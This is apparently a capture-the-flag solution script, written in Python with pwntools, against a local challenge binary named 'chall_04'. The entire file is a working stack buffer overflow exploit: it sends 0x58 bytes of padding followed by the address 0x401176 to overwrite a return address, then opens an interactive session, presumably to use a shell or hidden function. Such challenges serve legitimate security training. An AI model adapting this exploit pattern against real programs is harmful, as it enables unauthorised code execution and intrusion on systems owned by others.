# coding: utf-8
from pwn import *
pr = process("./chall_04")
add_1 = (0x60 - 8)
add_2 = (0x00401176)
payload = b'A'*(add_1) + p64(add_2)
pr.sendline(payload)
pr.interactive()
pr.close()
